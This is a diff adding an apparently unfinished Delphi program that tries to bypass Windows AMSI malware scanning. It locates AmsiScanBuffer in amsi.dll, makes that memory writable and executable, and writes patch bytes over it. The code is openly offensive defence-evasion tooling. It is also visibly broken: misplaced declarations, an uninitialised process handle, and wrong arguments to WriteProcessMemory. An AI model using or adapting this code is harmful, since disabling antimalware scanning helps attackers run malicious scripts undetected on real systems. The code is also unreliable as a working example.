@@ -1,0 +1,107 @@
+program BasedAmsi_E;
+
+{$APPTYPE CONSOLE}
+
+{$R *.res}
+
+{
+https://delphi.xcjc.net/viewthread.php?tid=43405
+https://www.swissdelphicenter.ch/en/showcode.php?id=950
+https://stackoverflow.com/questions/3838685/how-to-calling-dll-procedure-with-parameters
+https://www.programmersought.com/article/68031512922/
+https://microsoft.public.dotnet.framework.interop.narkive.com/2xfQFdy2/need-helping-passing-from-c-to-delphi
+https://etutorials.org/Programming/mastering+delphi+7/Part+II+Delphi+Object-Oriented+Architectures/Chapter+10+Libraries+and+Packages/Using+Existing+DLLs/
+https://web.archive.org/web/20200226082329/https://etutorials.org/Programming/mastering+delphi+7/Part+II+Delphi+Object-Oriented+Architectures/Chapter+10+Libraries+and+Packages/Using+Existing+DLLs/
+https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/
+https://stackoverflow.com/questions/47256130/how-to-use-writeprocessmemory-in-delphi
+}
+
+{
+P/Invoke later
+}
+
+
+function ReadProcessMemory(hProcess: THandle; const lpBaseAddress: Pointer;
+  lpBuffer: Pointer; nSize: SIZE_T; var lpNumberOfBytesRead: SIZE_T): BOOL; stdcall;
+
+
+
+
+uses
+  System.SysUtils, System.Rtti,  Windows
+  ;
+
+type UIntPtr = NativeUInt;
+
+var
+  lib : THandle;
+  OldProtect, DummyProtect: DWord;
+
+  asb : pointer;
+  //retpatch : Array[0..0] of byte = ($C3);
+  retpatch : Byte = $C3;
+  garbage : Array[0..7] of byte = ($41,$41,$41,$41,$41,$41,$41,$41);
+
+
+
+  hprocess: DWORD;
+
+  st: TSystemTime;
+  PID: DWORD;
+  hProc: THandle;
+  pst: Pointer;
+  NumWrote: SIZE_T;
+
+
+{https://stackoverflow.com/questions/47256130/how-to-use-writeprocessmemory-in-delphi}
+
+begin
+  try
+
+
+
+  //Load and get base address for AmsScanBuffer
+    lib := LoadLibrary('amsi.dll');
+    asb := GetProcAddress(lib,'AmsiScanBuffer');
+    WriteLn(Format('amsi.dll base address: %p',[asb]));
+
+
+  //Change memory prots
+  //0x40 or 64 or PAGE_EXECUTE_READWRITE works
+    VirtualProtect(asb, SizeOf(garbage), 64, OldProtect);
+    //VirtualAllocEx(hProc, nil, SizeOf(st), MEM_COMMIT, PAGE_READWRITE);
+
+
+  //Write to memory
+
+    //WriteProcessMemory(hProcess, Pointer(garbage), @retpatch, 1, nil);
+    WriteProcessMemory(hprocess, pointer(garbage),  @garbage, 2, Write);
+
+  //Reprotect memory
+    //VirtualProtect(asb, SizeOf(retpatch), 64, OldProtect);
+
+
+
+
+  except
+    on E: Exception do
+      Writeln(E.ClassName, ': ', E.Message);
+  end;
+end.
+
+
+
+//takes pointer to dll
+//and
+//array of bytes to patch with
+
+
+{https://stackoverflow.com/questions/9929981/delphi-7-writeprocessmemory}
+//procedure WriteBytes(hProcess: THandle; Address: Pointer;
+//  const
+//    Buffer: array of Byte);
+//var
+//  NumberOfBytesWritten: DWORD;
+//begin
+//  if not WriteProcessMemory(hProcess, Address, @Buffer[0], Length(Buffer), 0) then RaiseLastOSError;
+//end;
